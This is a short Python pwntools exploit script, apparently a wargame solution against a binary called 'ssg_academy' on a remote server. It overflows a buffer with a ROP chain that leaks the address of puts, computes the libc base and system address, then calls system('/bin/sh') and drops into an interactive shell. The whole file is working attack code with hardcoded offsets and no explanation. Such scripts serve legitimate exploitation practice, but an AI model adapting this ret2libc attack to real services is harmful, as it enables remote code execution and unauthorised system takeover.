from pwn import *


#s = process("./ssg_academy")
s = remote("war.sejongssg.kr",40005)
ELF("./ssg_academy")

pppr = 0x4007ea #pop rdi; pop rsi; pop rdx; ret
test = 0x400854
puts_got = 0x602020
puts_plt = 0x400660 
exp_here = 0x4008B5

s.recvuntil(">>")

s.sendline("19950610")
s.recvuntil(">>")
s.send("A"*0x148+p64(pppr)+p64(puts_got)+"A"*16+p64(puts_plt)+p64(exp_here))
s.recvuntil("+++++++++++++++++++++++++++++++++++")
s.recvuntil("+++++++++++++++++++++++++++++++++++")
s.recvuntil("\n")
s.recvuntil("\n")
puts_leak = u64(s.recv(6).ljust(8, '\x00'))
print hex(puts_leak)
libc_base = puts_leak - 0x6F690
system = libc_base + 0x45390

binsh = libc_base + 0x18CD17
print s.recvuntil(">>")
s.send("A"*0x148+p64(pppr)+p64(binsh)+"A"*16+p64(system))
s.interactive()